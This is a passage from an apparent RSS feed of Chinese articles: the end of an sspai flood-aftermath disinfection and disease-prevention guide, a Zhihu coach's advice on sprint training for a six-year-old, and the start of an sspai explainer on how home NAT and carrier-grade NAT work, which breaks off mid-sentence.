过快复温——容易引起低血压和复温休克！</li>\n</ul>\n<h2>洪水退去后的防疫措施</h2>\n<h3>居家环境检查与消毒</h3>\n<p>低层受淹房间需要彻底清洁后进行消毒处理。</p>\n<ul>\n<li>进入住宅后，首先应检查建筑物墙壁有无裂缝、歪斜、局部下沉和立柱是否腐烂等现象，如出现问题应对建筑物临时加固，在确保安全的基础上，再清洁室内环境。</li>\n<li>尽快清除各种垃圾、腐败食物及霉变物品，不能清洁消毒的物品也要丢掉（如污水浸泡的床垫、地毯、毛绒玩具等），消除蚊虫孳生地。</li>\n<li>冲洗墙壁、地面上的腐烂物质、污泥等。如发现有鼠洞，可用碎砖、碎石和黄沙水泥将洞堵死。</li>\n<li>地板、墙面、台面、卫生间洁具等硬质表面：可采用有效氯 500mg/L 含氯消毒剂，或 200mg/L 二氧化氯，或 1000mg/L 过氧乙酸进行喷洒、擦拭消毒，作用 30min。以喷湿为度。消毒后以清洁水冲洗干净。</li>\n<li>居室空气一般不需要消毒。将门窗全部打开通风，为防止霉菌生长，宜快速（24～48h以内）干燥房间，可用风扇、空调、除湿机清除房间水分。向室外吹风，勿向室内吹风。</li>\n<li>及时清除住宅周围的积水、垃圾污物等。</li>\n</ul>\n<h3>肠道传染病的预防</h3>\n<p>洪灾过后最容易爆发的肠道传染病包括霍乱、甲肝、伤寒、痢疾、感染性腹泻等。防疫要点如下：</p>\n<p><strong>食物安全：</strong></p>\n<ul>\n<li>给餐厨具消毒，简便实用的是煮沸消毒和氯化消毒法。可用开水煮 15min 或用消毒碗柜消毒，或用含有效氯 250mg/L 的消毒液浸泡 30min 后再用清水清洗。</li>\n<li>食物要煮熟煮透，没有条件煮的话尽量吃饼干、自热米饭面条等方便食品。</li>\n<li>洪水浸泡过的食物不可以吃，淹死、病死的禽畜、水产也不可以吃🙅‍♂️。</li>\n</ul>\n<p><strong>饮用水卫生：</strong></p>\n<ul>\n<li>不喝生水，尽量喝瓶装水和开水。</li>\n<li>装水的器具必须保持干净，经常倒空清洗。</li>\n<li>无法加热烧开的情况下可使用明矾澄清（水污浊时使用）、净水壶、饮用水消毒剂等处理后再饮用。常用的含氯消毒剂有漂白粉、漂粉精、漂白精片、含氯消毒剂泡腾片等，注意选用<strong>食品级的，避光干燥保存</strong>。按有效氯 4-8mg/L 投药，先将漂粉精片或泡腾片压碎放入碗中，加水搅拌至溶解，然后取该上清液倒入缸（桶）中，不断搅动使之与水混合均匀，加盖静置，直至达到消毒时间，切记要按说明书要求来。</li>\n</ul>\n<p><strong>个人卫生：</strong></p>\n<ul>\n<li>参与环境清污消毒、接触污染物或浸泡污水等后，均应进行手消毒。先用流水和洗手液/香皂清洗，擦干后再进行消毒。可选用含酒精的手消毒剂揉搓双手，也可用碘伏或其它皮肤消毒剂涂抹消毒。</li>\n<li>不要与别人共用脸盆、毛巾等个人生活用具。</li>\n</ul>\n<h3>呼吸道传染病的预防</h3>\n<p>呼吸道感染性疾 病在灾后很常见，如感冒、支气管炎、肺炎、扁桃体炎、流感等。</p>\n<p>防疫的要点是：</p>\n<ul>\n<li>不要过度疲劳，避免长时间淋雨或在雨水中浸泡，夜间注意保暖。</li>\n<li>不要随地吐痰或乱丢擦鼻涕的纸，勤洗手。</li>\n<li>保持室内清洁，勤开窗通风。</li>\n<li>注意均衡饮食和喝足够的饮用水。</li>\n</ul>\n<h3>其它传染病的预防</h3>\n<p>其它传染病还包括钩端螺旋体、蚊虫蜱虫叮咬传播的疟疾、黑热病等。</p>\n<p>防疫的要点是：</p>\n<ul>\n<li>做好粪便、垃圾、动物尸体的消毒，避免污染环境和水源。</li>\n<li>开展防鼠和灭鼠活动，搞好鼠疫疫苗的储备。</li>\n<li>喷洒化学杀虫剂，消除蚊虫孳生地，降低病媒生物的密度。</li>\n<li>个人防护要做好，驱蚊药、蚊帐少不了。</li>\n</ul>\n<h3>女性健康</h3>\n<p>脱离洪水后，不管男女有条件时都最好尽快清洁身体。</p>\n<p>女性阴道在正常情况下是前后壁贴合，再加上皮褶、生殖道长度以及宫颈口的阻隔，阴道炎和宫腔的感染不会那么容易发生。而由于尿道短、尿道口接触面广这样的生理特征，在长时间浸泡的洪水中后，女性更容易发生尿路感染。因此女性在脱险后要注意清洗外阴，并关注后续有没有尿频、尿急、尿痛的尿路刺激症状，关注阴道分泌物的性状，如果有异常尽快去医院就诊（如何自查请阅读<a href=\"https://sspai.com/post/67800\" target=\"_blank\">体检指南三</a>）。</p>\n<p>注：<strong>消毒液的使用需注意：</strong> 84 消毒液不可与其他消毒或清洁用品混用（比如洁厕灵、酒精等）；消毒液可能对衣物、家具等有一定的腐蚀性，达到作用时间后应用清水进行擦拭；文中未提到的其他消毒剂请严格按说明书配制使用。</p>\n<p><strong>参考文献及网站：</strong></p>\n<ul>\n<li>实用内科学，第 13 版</li>\n<li>生理学，八年制第 3 版</li>\n<li>中国淹溺性心脏停搏心肺复苏专家共识，中华急诊医学杂志 2020 年 8 月第 29 卷第 8 期</li>\n<li>Physiology Of Drowning: A Review. PHYSIOLOGY 31: 147–166, 2016. Published February 17, 2016; doi:10.1152/physiol.00002.2015.</li>\n<li>溺水后迟发性死亡死因探讨，法医学杂志，2004 年 11 月第 20 卷第 4 期</li>\n<li>低水温暴露对人体的影响与防护，人民军医，2015 年 12 月 1 日第 58 卷第 12 期</li>\n<li>体温过低复温技术及研究进展，人民军医 2016 年 4 月 1 日第 59 卷第 4 期</li>\n<li>洪涝灾害后的卫生防疫措施，灾害医学与救援（电子版），2013 年5月第 2 卷第 2 期</li>\n<li><a href=\"http://www.weather.com.cn/\" target=\"_blank\">中国天气网</a></li>\n<li><a href=\"https://www.mem.gov.cn/\" target=\"_blank\">中华人民共和国应急管理部</a></li>\n<li><a href=\"http://www.emerinfo.cn/index.htm?p1\" target=\"_blank\">中国应急信息网</a></li>\n<li><a href=\"https://www.henan.gov.cn/\" target=\"_blank\">河南省人民政府网站</a></li>\n</ul>\n<p><strong>关联阅读</strong></p>\n<ul>\n<li><a href=\"https://sspai.com/post/63189\" target=\"_blank\">掌握伤口自处理的小方法，帮你抓住自救和求助时机</a></li>\n<li><a href=\"https://sspai.com/post/65356\" target=\"_blank\">身边有人心跳骤停，我该怎么办？</a></li>\n<li><a href=\"https://sspai.com/post/63178\" target=\"_blank\">减少安全隐患，这些家中的事故重灾区需要你留心</a></li>\n</ul>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68024"},{"title":"6 岁的孩子说想学跑步，成为像苏炳添那样的运动员，作为家长该如何培养？","date":"2021-08-02 03:45:08","description":"\n<p>田径出身的一名大学田径队教练来谈一谈我的看法，希望有所借鉴。</p>\n<p>我先从专业的角度，来给一些解答。</p>\n<h2>7-14岁是孩子速度发展的一个窗口期</h2>\n<p>人的身体素质，包括速度、力量、耐力、灵敏、平衡等，在不同的年龄段，都会有发展比较迅速或缓慢的时候，当然儿童处在成长期，身体各指标都会快速增长，但总有增长尤为突出的某项指标，我们把这段快速增长的一段时期，称为快速发展的“窗口期”。</p>\n<p>为什么小学会把快速跑当成一个衡量身体素质的重要指标呢？就是因此此年龄段，正好处在孩子速度快速发展的阶段，在这个阶段有意识地培养孩子的速度，提升孩子的爆发力，就会事半功倍。</p>\n<p>作为一名田径运动员、教练，苏炳添能够以打破亚洲纪录记录的成绩闯进奥运会男子100米决赛，成为第一个站在飞人赛道的黄种人，我由衷感到自豪！这个时候，如果孩子热爱体育，有这样的信念支撑他，有这么一个强有力的偶像光环作为他的榜样，作为父母，我给的建议是：</p>\n<p><b>支持他，从心理和实际行动上，给他鼓励和帮助！</b></p>\n<p><b>因为我深知，扎根一个梦想的种子，对于一个满怀激情的孩子来说，是无比重要！而此时父母给予的帮助对孩子来说，定会弥足珍贵！</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-96c0e546fd86fab8e1ef5412b8270e58_720w.jpg?rss\" data-rawwidth=\"2428\" data-rawheight=\"1358\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-96c0e546fd86fab8e1ef5412b8270e58\" data-watermark-src=\"v2-0c8f2561dccc838fad0ffff2f2d7ff93\" data-private-watermark-src=\"v2-1f6e03bacaa0a6f6ef6a5961346576d0\"></p>\n<p>作为父母，孩子的监护人，看着子女健康成长，衣食无忧，建功立业，结婚生子，是我们所愿所想。但培养他们良好的行为习惯，磨炼他们坚强的意志品质，遵守社会公德和法律，是父母的职责所在，此外，我们还希望在顺境中为其欢欣鼓舞，逆境中支持鼓励，给他们心中埋下一粒种子，为他们的梦想保驾护航。</p>\n<p>那么6岁的孩子究竟是否合适？在这些练习过程中又要注意什么呢？父母又要做什么呢？不要着急，请听我一一解答。</p>\n<h2>田径是一切运动的基础</h2>\n<p>请允许我\"王婆卖瓜\"一番，田径是运动之母，我们自打出生起，就跟田径运动分不开。走、跑、跳、投等，融入到我们的生活方方面面。<b>6岁的孩子即将进入发展速度的窗口期，因此在此时学习跑步，是一项非常明智的选择，对于提升孩子的整体素质，大有裨益。</b>不论是否今后从事体育项目，都会让孩子收益。当然如果今后发现天赋异禀，转成其他专业，相信田径带来的益处，绝对会让孩子受益匪浅。</p>\n<p><br></p>\n<p>俗话说的好，“兴趣是最好的老师”。孩子有了明确的偶像，有了学的兴趣，可谓有了“人和”。此时又是孩子练习短跑提升速度的窗口期，正所谓拥有了“天时”，那么这个“地利”，究竟如何获得呢？也就是我下面要讲的练什么，以及怎么练，以及练习过程中的注意事项。</p>\n<h2>身体锻炼一定要符合孩子身心发展</h2>\n<p>练什么怎么练，主要依据还是儿童在此时期的生理特点及心理特点来决定。孩子在6岁时，活泼爱动是天性，喜欢追赶打闹。你会发现带娃出去玩的时候，他们喜欢跑跑就停下，没休息多久马上就到处跑的情况反复发生。到底是为什么呢？简单来讲，<b>小朋友就好比一个封不上口的气球</b>，气打多了就会爆掉，因此能量存储有限。释放能量时，因为封不上口，“呼”的一下就全放走了，所以他们就容易累。气没了，再打气，不一会儿，他们又活力满满了。</p>\n<p>基于儿童身心发展特点，在给小朋友安排短跑练习时，有几个原则。</p>\n<blockquote>\n<b>第一，少量多次。</b><br><b>第二，循序渐进。</b><br><b>第三，娱乐性强。</b><br><b>第四，目标明确。</b>\n</blockquote>\n<h3><b>Rule NO.1 少量多次</b></h3>\n<p>小朋友耐力差，因此单次跑步的练习，距离一定不要长，控制好运动量。在每个单元的训练，合理规划好热身、练习时间、休息时间、放松，并且在休息时要注意补水和补充能量。多次，是因为儿童恢复能力好，可以在短暂休息后，再继续进行下一次练习。</p>\n<p>比如，我们在一堂40分钟的训练课中，可以给儿童安排10分钟的热身，热身时可进行慢跑或者做一些跟跑动有关的游戏，带着小朋友活动头、肩、髋、膝、踝各个关节，拉伸手臂和腿部肌肉，达到热身目的。25分钟的正课时间里，安排3组20米跑，组间休息1-2分钟，3组50米跑，组间休息2-3分钟。20米完成后，可增加休息时间，再进行50米练习。最后5分钟用来整理和放松，重点进行大、小腿的拉伸和背部的伸展放松。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-8912ea1c3cc3782205098ceeff5ed43f_720w.jpg?rss\" data-rawwidth=\"1026\" data-rawheight=\"548\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-8912ea1c3cc3782205098ceeff5ed43f\" data-watermark-src=\"v2-15b887ec5b1ae845b7a789035753b55f\" data-private-watermark-src=\"v2-50024f195a572935e12d543711ea183a\"></p>\n<h3>Rule NO.2 循序渐进</h3>\n<p>即使有了偶像，自己有浓厚的兴趣，也要注意循序渐进。苏炳添将近32岁，历时3届奥运之旅才终于冲进决赛，我们也不可能一天两天，一年两年，就能有质的飞跃。<b>尤其是在成绩大幅增长的时候，更应该注意保护，不能猛进。</b>我当年跳高受伤，就是因为在3个月从1.70米长了20厘米，身体其他方面素质没有跟上，太过激进，才会受伤影响了后续成绩增长的。因此，循序渐进，在孩子已经适应了前一单元的量和强度后，才可以再增加。</p>\n<p>例如，在前一次安排的主要内容里，小朋友在3组20米，3组50米已经可以完成后，在递进的练习中，可以通过增加量或者增加强度，以及同时增加量和强度的形式进行变换组合。</p>\n<p>PlanA 建议在保证运动强度不变的前提下，先提高运动量。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-2e96f88f39e8d11bd9c4cd81320a4dec_720w.jpg?rss\" data-rawwidth=\"1012\" data-rawheight=\"554\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-2e96f88f39e8d11bd9c4cd81320a4dec\" data-watermark-src=\"v2-9a55b9b4834a383a6e86c1b909786f66\" data-private-watermark-src=\"v2-ae0c4494d14d53027caccc624df1b19e\"></p>\n<p>PlanB 完成A方案后，再在运动量不变的情况下，提高运动强度。因为小朋友没有经过系统训练，很难体会速度感，不了解90%的速度跑和100%全力冲刺的区别，因此我们可以通过缩短间歇时间来提高运动强度。但要注意20米和50米之间的间歇要保障，进行休息和补水。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-ca3b8640965669f06b2c28993544ef21_720w.jpg?rss\" data-rawwidth=\"1010\" data-rawheight=\"572\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-ca3b8640965669f06b2c28993544ef21\" data-watermark-src=\"v2-91de07b77e77fdde00f2ab18a37733fa\" data-private-watermark-src=\"v2-1cda9f216ad02f5c1855b7c9f1a1bb70\"></p>\n<p>PlanC 运动量和强度分别提升且适应后，再同时提高。这一单元的训练，对成绩的提升尤为重要，同样需要注意在20米结束后，保证充足的休息时间。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-7ad885ef5346ea4e8e1e4543bcde23ac_720w.jpg?rss\" data-rawwidth=\"1028\" data-rawheight=\"570\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-7ad885ef5346ea4e8e1e4543bcde23ac\" data-watermark-src=\"v2-9974145b54fd4a9aa7401b2024c33845\" data-private-watermark-src=\"v2-b75f1714d5343d75c1cdb736cb7c19d8\"></p>\n<p>根据儿童运动能力的提升和实际情况，组数、间歇时间，甚至是跑动距离都可以进行调整，这些计划和安排，都要因人而异，适时调整和改变。</p>\n<h3>Rule NO.3 娱乐性强</h3>\n<p>根据儿童心理发展特点，枯燥单一的练习，会让孩子失去兴趣。因此娱乐性就显得尤为重要。我们可以通过改变形式、方法，增加器材、设备等，提升孩子的兴趣，让看似枯燥的田径运动，也能发挥出它应有的魅力，让孩子在真正下定决心从事这项运动之前，仍然能够保有兴趣，让激情不被扼杀在摇篮里。<b>毕竟，真正的训练是非常苦的，每个奥运选手的成长之路，训练都是无比艰辛和刻苦，他们付出了常人无法想象的努力和心血。</b></p>\n<p>儿童在这个年龄，不仅仅是单一的直线跑。可以设定标志点，比如多种形式的折返跑、比如多人追逐跑（从前最常见的老鹰抓小鸡、撕名牌等）、配合道具的模仿救护员、消防员营救等多种形式，持球或其他物品的传递或亲子接力等，都可以融入进来，让孩子在提升速度练习的同时，觉得好玩并愿意坚持下去。</p>\n<p>去年冬天我带着小萌利用标志点进行了一些速度练习，可以跟各位分享几种方式方法。</p>\n<a href=\"https://www.zhihu.com/zvideo/1405368268631220224\">萌爸Kyle-标志点的速度练习</a><h3>Rule NO.4 目标明确</h3>\n<p>目标明确孩子执行力才更强。要有长期目标和短期目标。长期目标要有大的方向，尤其如果今后是奔着职业运动员发展的，要有一个大概的时间点，在此之前需要提升的专项素质和身体素质，都要达到要求才可以。短期目标要实际可操作付出努力后能达到，小到一次训练中孩子需要跑的距离，次数、时间等，都要有制定，这样孩子才会有动力，训练之后达成目标才会有成就感，也会激励他再接再厉继续前行。</p>\n<p>我们不能仅仅能看到的成绩的快慢。循序渐进，扎实走好每一步，有明确的目标，经过艰苦训练，才是苏炳添最终登上荣耀舞台的法宝。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-27c0964e1a9badd2229e15ee3a0e13f6_720w.jpg?rss\" data-rawwidth=\"2400\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"苏炳添的名字印刻在奥运会男子100米飞人大战的战场\" data-watermark=\"watermark\" data-original-src=\"v2-27c0964e1a9badd2229e15ee3a0e13f6\" data-watermark-src=\"v2-7910049c7652a94ec5b7cba374a8ed58\" data-private-watermark-src=\"v2-3cec0b19dc1f69b662064b823b73d546\"></p>\n<p>作为一名田径教练员，我也会根据不同项目，在不同时间，给队员安排具体的训练计划，让队员有目标，有侧重点，可操作，能执行。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-3087386865d503c9f89cd2b85b6e039b_720w.jpg?rss\" data-rawwidth=\"970\" data-rawheight=\"1054\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-3087386865d503c9f89cd2b85b6e039b\" data-watermark-src=\"v2-4083ba3c14aa26a1bb0ae887f21abffe\" data-private-watermark-src=\"v2-563ea294176285689e12f85c051dd35b\"></p>\n<h2>父母到底应该做什么？怎样支持孩子呢？</h2>\n<p>6岁的儿童还处在身体发展阶段，作为一名专业的田径教练员，<b>我强烈反对过早的竞技化</b>。因此，<b>不要把孩子送进体校，也不要过早确定短跑这个项目！</b></p>\n<p>如果家长有条件，可以先给孩子试着报一些体能培训班，当然有些培训机构以赚钱为目的，教练的能力参差不齐，有的会为了“效果”，过早的榨干孩子的潜能，而单一发展学生的某一身体素质。</p>\n<p>这时候，如果能送到有田径队的学校（大学、中学、小学皆可）里让孩子跟着活动，或送到更专业的地方就再好不过，<b>一定要跟教练说明来意，并表明观点：让孩子跟着玩，但不能像专业运动员一样练。</b>这么做的目的，一方面进行练习时会正规、系统；另一方面，可以让教练观察一下孩子在这方面是否有天赋。</p>\n<p>毕竟，竞技体育的选材都是非常严苛的。如果过早开发，可能会让孩子失去冲击更好成绩的机会；但如果孩子没有天赋，也好及时转型，避免时间、精力的浪费。但不论是否走专业路线，让孩子从事体育锻炼，适度练习对身体有很大好处，有益且有效。父母在孩子没有独立判断事情的能力之前，帮助孩子做最合理的决策，出谋划策，为他们的梦想护航，让他们向着正确的方向稳步前行。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/meng-ba-kyle?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">萌爸Kyle</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/476569561/answer/2033431219?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">106 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/35348789?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">博尔特是不是人类体育史上最伟大的运动员？</a><br><a href=\"http://www.zhihu.com/question/20350644?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">博尔特能否被称作迄今为止最伟大的田径运动员？</a><br>\n","link":"http://www.zhihu.com/question/476569561/answer/2033431219?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"家庭网络中的「NAT」到底是什么？","date":"2021-08-02 03:30:33","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>在使用网络的过程中，或许你会遇到这样的问题：</p>\n<ul>\n<li>Nintendo Switch 等游戏主机上的 NAT Type 是 D，<a href=\"https://www.nintendoswitch.com.cn/support/faq/336.html\">导致无法联机游戏</a>；</li>\n<li>使用 eMule 下载文件时，发现获取到了 Low ID，<a href=\"https://www.emule-project.net/home/perl/help.cgi?l=42&amp;topic_id=1632&amp;rm=show_topic\">导致下载速度变慢</a>；</li>\n<li>家中的 NAS 只能在内网使用，很难将 NAS 上的文件分享给其他人。出门在外时，想要下载 NAS 上的文件，也发现无法连接。</li>\n</ul>\n<p>或许你还会对这些问题感到好奇：</p>\n<ul>\n<li>每天有那么多人使用微信进行视频通话，腾讯的服务器是否能承受这么大的流量？是否需要支付高额的流量费用？</li>\n<li>为什么在十多年前，我们就看到过 <a href=\"https://www.icann.org/zh/announcements/details/to-4294967296-and-beyond--under-10-of-ipv4-space-remains-adoption-of-ipv6-is-essential-29-1-2010-zh\">IP 地址资源不足的新闻</a>。而现在，互联网用户越来越多，IP 地址资源不足却似乎并没有给我们带来什么影响。</li>\n</ul>\n<p>其实，这些问题都与 NAT 有关。少数派上已经有两篇文章，也提到了 NAT：</p>\n<ul>\n<li><a href=\"https://sspai.com/post/64430\">入网指南 04 | IP 地址大揭秘 - 少数派</a></li>\n<li><a href=\"https://sspai.com/post/62402\">局域网游戏串流：让我们都做一回「云」玩家 - 少数派</a></li>\n</ul>\n<p>那么，NAT 到底是什么？NAT 会为我们的「网上冲浪」带来哪些不便之处？如何解决 NAT 为我们带来的不便？…… 本文将尝试详细地解答这些问题。</p>\n<h2>为什么需要 NAT</h2>\n<p>在 Internet 上，每台设备都有一个 IP 地址。IP 地址和我们日常生活中的家庭住址类似，一台设备想和另一台设备通信，必须知道另一台设备的 IP 地址，才能将数据发送到对方。</p>\n<p>对于 IP 地址的基础知识，少数派已经有一些文章进行了介绍。读者可参考这些文章进行了解：</p>\n<ul>\n<li><a href=\"https://sspai.com/post/64430\">入网指南 04 | IP 地址大揭秘 - 少数派</a></li>\n<li><a href=\"https://sspai.com/post/64688\">小白也能看懂的网络基础 04 | IP地址是如何工作的 - 少数派</a></li>\n<li><a href=\"https://sspai.com/post/65428\">小白也能看懂的网络基础 05 | IP 地址深度学习 - 少数派</a></li>\n</ul>\n<p>对于个人、家庭的网络设备，IP 地址一般由运营商分配。在过去，一户家庭一般只有一台电脑，这台电脑通过调制解调器（moden）直接接入 Internet，获取运营商分配的 IP 地址。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/31/db0827796197b9f7023cab239508238f.png\"></figure><p>而现在，很多家庭会同时拥有手机、电脑、智能家居等多种联网设备，一个 IP 地址完全不够这么多设备使用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/31/e16d17fa9c55fb5fceb7c9da37d47639.png\"></figure><p>对于常用的 IPv4 地址，其格式是这样的：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/31/eb843b3123289b09ac2fe4165a326655.png\"></figure><p>可以看出，IPv4 地址一共有 4 294 967 296 个。由于全球互联网用户越来越多，IPv4 地址<a href=\"https://en.wikipedia.org/wiki/IPv4_address_exhaustion\">已经严重不足</a>。</p>\n<p>综上，如下两个原因，让我们面临了 IP 地址不够用的问题：</p>\n<ol>\n<li>家庭中有多个设备需要联网，但运营商只会分配一个 IP 地址</li>\n<li>全球联网设备越来越多，但 IPv4 地址资源有限</li>\n</ol>\n<p>所以，我们需要一种技术，让多个设备「共用」同一个 IP 地址，来缓解 IPv4 地址不够用的问题。</p>\n<h2>什么是 NAT</h2>\n<p>NAT 的全称是「网络地址转换」（Network Address Translation），指的是路由器等网络设备，在传输数据的过程中，改变数据中的 IP 地址的一种技术。</p>\n<p>NAT 可用于内网 IP 地址（以下简称为「内网 IP」）和公网 IP 地址（以下简称为「公网 IP」）之间的转换。例如家庭中的多个联网设备，都拥有各自的内网 IP，无线路由器运行 NAT 功能；家中的设备向外发送数据时，数据中的内网 IP，在无线路由器上会被转换为公网 IP；外部数据发送到家庭设备时，数据中的公网 IP，会被转换为内网 IP。</p>\n<p>通过这种方式，家庭设备能够「共享」同一个 IP 地址。即使运营商只为用户分配了一个 IP 地址，用户家中的多台设备，也能同时访问 Internet。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/31/e41eed783250eb2b8b5bf3e163ff8719.png\"></figure><p>做为对比，如果没有 NAT，家中每一个设备，都需要获取一个独立的公网 IP 地址，对于本来就少的 IPv4 地址资源，就显得有点「奢侈」了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/31/5be0efd0e34ca24b34efcda9cc792159.png\"></figure><p>另外，在 IPv4 地址资源越来越紧张的今天，很多电信运营商，已经不再为用户分配公网 IP；而是直接在运营商自己的路由器上运营 NAT，为用户分配内网 IP。这样，只需要少量的 IP 地址，就可以支撑大量用户的上网需求。这样的 NAT 又叫做 <a href=\"https://zh.wikipedia.org/wiki/%E7%94%B5%E4%BF%A1%E7%BA%A7NAT\">CGN（Carrier-grade NAT，电信级 NAT）</a>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/31/b4003eaa124530fc3bc83ceb38b591cc.png\"></figure><h2>NAT 是如何工作的</h2>\n<p>NAT 改变了报文中的 IP 地址。但是，为什么我们平时上网时，并没感觉到 NAT 的存在？</p>\n<p>在上文中的例子里，多台内网设备共用同公网 IP。外部数据到达路由器后，路由器应该将数据发送给哪个内网设备？</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/31/2bb64cd2ff00510bdbf7e0751217640f.png\"></figure><p>在介绍 NAT 的工作原理之前，让我们先了解一下另外一个概念：端口号。</p>\n<ul><li><a href=\"https://sspai.com/post/65470\">小白也能看懂的网络基础 07 | TCP和UDP是如何工作的？ - 少数派</a></li></ul>\n<p>简单说，在网络中传输的数据，会被拆分一个个较小的片段。每个片段被称为一个报文。在报文中，除了 IP 地址，一般还包含了端口号。</p>\n<p>IP 地址每台电脑唯一，用来找到网络中的电脑。端口号每个应用程序唯一，报文到达电脑后，可根据端口号匹配到应用程序。</p>\n<p>在报文中，包含了两个 IP 地址和两个端口号，分别是来源 IP、目的 IP、来源端口、目的端口：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/31/c1360b2832660f16b0750728fc72fe6b.png\"></figure><p>我们使用的大部分软件，例如网页浏览器，都是客户端软件。客户端需要主动向服务器发起连接。</p>\n<p>例如，当我们访问少数派网站 <code>sspai.com</code> 后，浏览器能够解析到网站的 IP 地址（下文以 <code>119.23.1.2</code> 为例，不代表网站真实 IP），主动向该地址发起报文，建立连接。由于浏览网页使用的 HTTPS 协议，端口号为 443，所以报文中的目的端口号填充为 443，来源端口号是一个随机分配的值。</p>\n<p>当少数派网站收到请求后，则会向用户的浏览器发送网页数据<sup class=\"ss-footnote\" href=\"\" title=\"实际上，TCP 连接需要经过三次握手。此处简化了描述。\" footnote-id=\"1\">1</sup>。发送的数据中，来源端口号为 443，目的端口号则为用户请求报文中的源端口号。</p>\n<p>从下图中也可以看出，回应报文的目的 IP，就是请求报文的源 IP，也就是用户电脑的 IP 地址；回应报文的目的端口号，就是请求报文中的源端口号，也就是用户浏览器的端口号。这样，少数派服务器的回应报文，就能根据 IP 地址发送回用户电脑，并根据端口号最终到达浏览器：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/31/32073941ef1686cdf7f73027ac387d7d.png\"></figure><p>那么，如果用户的电脑是内网设备，经过了 NAT，使用浏览器访问少数派网站时，又会是什么样的过程呢？</p>\n<p>首先，浏览器同样会发送请求报文，报文的源 IP 为电脑的内网 IP （此处以 192.168.1.126 为例）。</p>\n<p>当报文到达路由器后，路由器将报文源 IP 修改为公网 IP（1.1.1.10），并分配一个新的源端口号。<strong>在这个过程中，路由器会记录下源 IP 和源端口号，在转换前后的对应关系，形成 NAT 表项。</strong></p>\n<p>路由器将源 IP 和源端口号转换后的报文发送到服务器，服务器回应的报文，目的 IP 和目的端口端口号，就是请求报文中的源 IP 和源端口号。这样，报文就能根据目的 IP，到达用户的路由器上。</p>\n<p>路由器收到来自服务器的报文，根据 NAT 表项，将目的 IP 和目的端口号，从外部 IP、外部端口，转换为内部 IP、内部端口。这样，报文就能顺利到达用户电脑的浏览器上。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/31/2676d7a3b1cbbed3303b407ae4ea2446.png\"></figure><p>从上面的例子中可以看出，NAT 通过记录端口号<sup class=\"ss-footnote\" href=\"\" title=\"我们常用的 NAT 需要记录端口号信息，所以也叫 NAPT。也有一些不需要端口号的 NAT，不在本文的介绍范围内。\" footnote-id=\"2\">2</sup>、IP 地址的对应关系，将出方向报文的源 IP、源端口号从内部地址转换为外部地址，将入方向报文的目的 IP、目的端口号从外部地址转换为内部地址，让内网设备也能正常访问 Internet。但如下两种情况，是 NAT 难以做到的：</p>\n<ol>\n<li>内网设备做为服务器，外部设备主动向内网设备发起连接</li>\n<li>使用 TCP、UDP 之外的、没有端口号的协议进行通信<sup class=\"ss-footnote\" href=\"\" title=\"除了 TCP 和 UDP，NAT 也支持处理 ICMP 报文，例如 ping 工具使用的报文。\" footnote-id=\"3\">3</sup>\n</li>\n</ol>\n<p>由于我们日常上网，使用的基本上都是 TCP 和 UDP 